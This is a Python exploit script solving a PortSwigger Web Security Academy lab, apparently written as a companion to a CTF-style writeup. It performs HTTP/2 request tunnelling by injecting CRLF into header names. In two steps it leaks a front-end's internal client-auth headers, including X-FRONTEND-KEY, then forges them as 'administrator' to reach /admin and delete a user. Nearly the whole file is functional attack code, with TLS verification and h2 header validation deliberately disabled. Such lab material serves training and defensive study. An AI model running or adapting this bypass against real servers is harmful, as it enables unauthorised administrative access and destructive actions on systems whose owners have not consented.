#!/usr/bin/env python3
"""
Bypassing access controls via HTTP/2 request tunnelling
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 19-h2-tunnelling-bypass-access-controls.md

What this does:
    The front-end here doesn't reuse connections to the back-end, which
    closes off every classic connection-poisoning smuggling technique --
    so this hides an entire second request inside a single HTTP/2 header
    NAME via CRLF injection, producing a request tunnel that completes
    inside one request-response round trip.

    Step 1 leaks the front-end's client-authentication headers
    (X-SSL-VERIFIED, X-SSL-CLIENT-CN, X-FRONTEND-KEY) by converting the
    search feature into a POST, injecting a CRLF-laden header name that
    smuggles an oversized Content-Length and an extra search= parameter,
    and padding the body past that boundary -- so the reflected search
    result leaks the raw headers the front-end appended after the
    injection point.

    Step 2 forges those exact headers via a second CRLF-in-header-name
    injection, this time terminating early with \\r\\n\\r\\n so the back-end
    never sees the front-end's real (unforgeable) headers appended after
    ours -- only our forged ones. That's enough to reach /admin directly.

    Requires the Python h2 library with validate_outbound_headers=False
    and normalize_outbound_headers=False -- the default settings silently
    strip the \\r\\n sequences this attack depends on.

Usage:
    python 19-h2-tunnelling-bypass-access-controls.py <lab-url>
    e.g. python 19-h2-tunnelling-bypass-access-controls.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx h2
"""

import re
import socket
import ssl
import sys
from urllib.parse import urlparse

import httpx


def create_h2_connection(host: str, port: int = 443, timeout: float = 10.0):
    """HTTP/2 TLS connection with h2 ALPN. Both validate_outbound_headers
    and normalize_outbound_headers must be disabled or the library silently
    strips the \\r\\n sequences this attack depends on."""
    import h2.connection as h2c
    import h2.config as h2cfg

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    sock = socket.create_connection((host, port), timeout=timeout)
    ssl_sock = ctx.wrap_socket(sock, server_hostname=host)

    config = h2cfg.H2Configuration(
        client_side=True, header_encoding="utf-8",
        validate_outbound_headers=False,
        normalize_outbound_headers=False,
    )
    conn = h2c.H2Connection(config=config)
    conn.initiate_connection()
    ssl_sock.sendall(conn.data_to_send())

    ssl_sock.settimeout(3)
    try:
        data = ssl_sock.recv(65535)
        conn.receive_data(data)
        ssl_sock.sendall(conn.data_to_send())
    except socket.timeout:
        pass
    return ssl_sock, conn


def exploit_h2_tunnel_header_leak(host: str, port: int = 443, body_param: str = "search",
                                   post_path: str = "/", cl_value: int = 110) -> dict:
    """Leak internal front-end headers via HTTP/2 CRLF in a header NAME.
    Front-ends that sanitize header values for injected control characters
    don't necessarily apply the same sanitization to header names."""
    import h2.events as h2e

    ssl_sock, conn = create_h2_connection(host, port)
    crlf_header_name = f"foo: bar\r\nContent-Length: {cl_value}\r\n\r\n{body_param}="
    headers = [
        (":method", "POST"),
        (":path", post_path),
        (":authority", host),
        (":scheme", "https"),
        ("content-type", "application/x-www-form-urlencoded"),
        (crlf_header_name, "x"),
    ]
    conn.send_headers(1, headers, end_stream=False)
    conn.send_data(1, b"x=1", end_stream=True)
    ssl_sock.sendall(conn.data_to_send())

    ssl_sock.settimeout(10)
    result_data = b""
    try:
        while True:
            chunk = ssl_sock.recv(4096)
            if not chunk:
                break
            events = conn.receive_data(chunk)
            for event in events:
                if isinstance(event, h2e.DataReceived):
                    result_data += event.data
                    conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                elif isinstance(event, h2e.StreamEnded):
                    ssl_sock.sendall(conn.data_to_send())
                    raise StopIteration
            ssl_sock.sendall(conn.data_to_send())
    except (socket.timeout, StopIteration):
        pass
    ssl_sock.close()

    body_str = result_data.decode(errors="replace")
    leaked = {}
    m = re.search(r"search results for '(.*?)'", body_str, re.DOTALL)
    if m:
        raw = m.group(1)
        for line in raw.replace("\\r\\n", "\r\n").split("\r\n"):
            if ": " in line:
                k, v = line.split(": ", 1)
                k = k.strip()
                if k and not k.startswith(":"):
                    leaked[k] = v.strip()
    return leaked


def exploit_h2_tunnel_auth_bypass(host: str, path: str, auth_headers: dict, port: int = 443) -> tuple:
    """Forge the client-auth headers via CRLF in a header NAME, terminated
    early with \\r\\n\\r\\n so the back-end sees only our forged headers and
    never the real ones the front-end appends afterward."""
    import h2.events as h2e

    ssl_sock, conn = create_h2_connection(host, port)

    injected_lines = ["foo: bar"]
    for k, v in auth_headers.items():
        injected_lines.append(f"{k}: {v}")
    injected_lines.append("\r\n")
    crlf_header_name = "\r\n".join(injected_lines)

    headers = [
        (":method", "GET"),
        (":path", path),
        (":authority", host),
        (":scheme", "https"),
        (crlf_header_name, "x"),
    ]
    conn.send_headers(1, headers, end_stream=True)
    ssl_sock.sendall(conn.data_to_send())

    ssl_sock.settimeout(10)
    result_data = b""
    status = 0
    try:
        while True:
            chunk = ssl_sock.recv(8192)
            if not chunk:
                break
            events = conn.receive_data(chunk)
            for event in events:
                if isinstance(event, h2e.ResponseReceived):
                    hdrs = {
                        k.decode() if isinstance(k, bytes) else k:
                        v.decode() if isinstance(v, bytes) else v
                        for k, v in event.headers
                    }
                    status = int(hdrs.get(":status", "0"))
                elif isinstance(event, h2e.DataReceived):
                    result_data += event.data
                    conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                elif isinstance(event, h2e.StreamEnded):
                    ssl_sock.sendall(conn.data_to_send())
                    raise StopIteration
            ssl_sock.sendall(conn.data_to_send())
    except (socket.timeout, StopIteration):
        pass
    ssl_sock.close()
    return status, result_data.decode(errors="replace")


def find_delete_link(body: str, username: str = "carlos") -> str | None:
    m = re.search(rf'href="([^"]*delete[^"]*username={username}[^"]*)"', body)
    if m:
        return m.group(1)
    m = re.search(rf'(/admin/delete\?username={username})', body)
    return m.group(1) if m else None


def solve(lab_url: str) -> None:
    host = urlparse(lab_url).hostname

    print("[*] Step 1: leaking internal auth headers via search endpoint...")
    leaked = {}
    for cl in (80, 100, 105, 108):
        leaked = exploit_h2_tunnel_header_leak(host, body_param="search", post_path="/", cl_value=cl)
        if "X-FRONTEND-KEY" in leaked:
            break
    if not leaked.get("X-FRONTEND-KEY"):
        print("[-] Failed to leak X-FRONTEND-KEY.")
        return
    print(f"[+] Leaked headers: {leaked}")

    auth_headers = {
        "X-SSL-VERIFIED": "1",
        "X-SSL-CLIENT-CN": "administrator",
        "X-FRONTEND-KEY": leaked["X-FRONTEND-KEY"],
    }

    print("[*] Step 2: accessing /admin with forged auth headers...")
    status, body = exploit_h2_tunnel_auth_bypass(host, "/admin", auth_headers)
    print(f"[+] /admin status: {status}")
    if status != 200:
        print("[-] Failed to access admin panel.")
        return

    delete_link = find_delete_link(body)
    if not delete_link:
        print("[-] Delete link for carlos not found in admin panel.")
        return
    print(f"[+] Delete link: {delete_link}")

    print("[*] Step 3: deleting carlos...")
    status2, _ = exploit_h2_tunnel_auth_bypass(host, delete_link, auth_headers)
    print(f"[+] Delete status: {status2}")

    check = httpx.get(lab_url + "/", verify=False)
    print(f"[+] Solved: {'is-solved' in check.text}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
